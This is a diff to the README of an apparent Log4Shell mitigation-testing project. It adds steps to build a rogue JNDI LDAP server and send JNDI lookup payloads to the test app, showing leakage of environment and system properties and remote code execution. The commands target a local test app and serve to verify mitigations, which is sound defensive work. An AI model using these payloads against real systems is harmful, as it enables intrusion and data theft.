@@ -72,6 +72,29 @@ When the mitigation is in place, the debugger should never get in the code block
 [2021-12-12 10:59:15,591] [main] [log4shell.mitigation.tester.App] INFO Provided command line arguments are [${jndi:ldap://127.0.0.1/a?user=${env:USER}}]
 ```
 
+### Exploiting with Rogue JNDI
+
+in one terminal
+```
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+# build with PR https://github.com/veracode-research/rogue-jndi/pull/11 changes
+git fetch origin pull/11/head
+git checkout FETCH_HEAD
+mvn package
+# sample command is for Linux, remove `-c "zenity --progress --pulsate --text=You_are_hacked"` on other OSes or use any suitable RCE command
+java -jar target/RogueJndi-1.1.jar -c "zenity --progress --pulsate --text=You_are_hacked"
+```
+
+in another terminal:
+```
+# demonstrate information leakage
+java -jar app/build/libs/app-all.jar '${jndi:ldap://127.0.1.1:1389/user=${env:USER},vendor=${sys:java.vendor},javaversion=${sys:java.vm.version},os=${sys:os.version}}'
+# demonstrate RCE by adding "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
+java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar app/build/libs/app-all.jar '${jndi:ldap://127.0.1.1:1389/o=reference}'
+```
+
+
 ## Kubernetes / docker mitigation solutions for Log4Shell
 
 It is necessary to mitigate Log4Shell immediately without waiting for a new software release. Here are some solutions for doing that quickly and effectively.
